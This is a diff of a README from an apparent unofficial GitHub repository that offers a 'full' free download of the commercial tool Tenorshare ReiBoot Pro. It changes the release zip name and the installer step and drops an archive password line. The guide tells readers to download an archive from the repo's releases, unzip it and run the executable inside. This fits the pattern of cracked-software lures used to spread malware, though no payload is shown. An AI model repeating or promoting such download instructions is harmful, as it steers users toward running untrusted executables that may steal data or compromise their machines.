@@ -1,13 +1,10 @@
 > [!TIP]
 > ## Guide:
-> - Download Tenorshare_Reiboot_FULL.zip
+> - Download Tenorshare.ReiBoot.Pro.9.4.3.zip
 > - Unzip to any folder
-> - Run SoftwareInstaller.exe
+> - Run Set-up
 
-# ***Password for archive: 2025***
-
-
-# [DOWNLOAD](https://github.com/Haegrin6/Tenorshare-Reiboot-For-PC/releases/download/reiboot/Tenorshare_Reiboot_FULL.zip)
+# [DOWNLOAD](https://github.com/Haegrin6/Tenorshare-Reiboot-For-PC/releases/download/reiboot/Tenorshare.ReiBoot.Pro.9.4.3.zip)
 
 
 > [!NOTE]
